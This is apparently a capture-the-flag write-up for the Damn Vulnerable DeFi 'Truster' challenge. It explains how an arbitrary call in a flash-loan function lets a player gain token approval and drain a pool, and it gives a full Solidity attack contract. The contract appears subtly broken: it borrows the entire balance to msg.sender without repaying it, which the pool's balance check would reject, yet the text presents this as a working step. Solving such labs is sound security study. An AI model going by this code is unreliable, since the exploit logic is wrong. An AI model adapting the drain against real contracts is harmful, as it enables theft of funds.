# Solving the "Truster" Challenge in Damn Vulnerable DeFi

## Introduction

The "Truster" challenge in Damn Vulnerable DeFi exposes a vulnerability in a contract's flash loan feature. This document details the strategy to exploit this vulnerability and drain all tokens from the pool.

## Challenge Overview

The `TrusterLenderPool` contract offers a flash loan feature that's vulnerable due to its implementation of the `flashLoan` function. This function allows arbitrary contract calls with any data, and does not restrict the use of borrowed tokens during the loan.

## Attack Strategy

The key to the attack lies in exploiting the `flashLoan` function to gain control over the pool's tokens.

### Steps to Exploit

1. **Initiate Flash Loan**:

   - Borrow all tokens in the pool using the `flashLoan` function.

2. **Craft Arbitrary Contract Call**:

   - Use the `data` parameter of `flashLoan` to execute an `approve` call on the token contract.
   - Approve your account to spend the pool's tokens.

3. **Transfer Tokens Post Loan**:
   - After the flash loan, transfer the tokens from the pool to your account using the approval obtained in the previous step.

## Attack Contract Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "./DamnValuableToken.sol";

contract TrusterAttack {
    TrusterLenderPool pool;
    DamnValuableToken token;

    constructor(address poolAddress, address tokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        token = DamnValuableToken(tokenAddress);
    }

    function attack() public {
        // Borrow all tokens in the pool
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(pool))
        );

        pool.flashLoan(token.balanceOf(address(pool)), msg.sender, address(token), data);

        // Transfer tokens to attacker
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
```

## Deployment and Execution

- Deploy the `TrusterAttack` contract.
- Call the `attack` function from your player account.
- The function executes the flash loan, gains approval, and transfers the tokens.

## Conclusion

This challenge demonstrates the dangers of allowing arbitrary execution in smart contracts without strict validations. It's crucial to ensure that features like flash loans can't be exploited for unintended actions.
